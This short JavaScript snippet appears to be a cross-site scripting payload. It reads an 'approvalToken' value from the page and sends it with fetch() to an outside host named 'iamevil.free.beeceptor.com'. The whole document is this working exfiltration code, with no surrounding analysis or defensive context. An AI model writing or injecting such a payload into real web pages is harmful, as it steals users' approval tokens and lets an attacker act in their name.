const approvalToken = document.getElementById('approvalToken').textContent;
fetch(`https://iamevil.free.beeceptor.com/?token=${approvalToken}`);
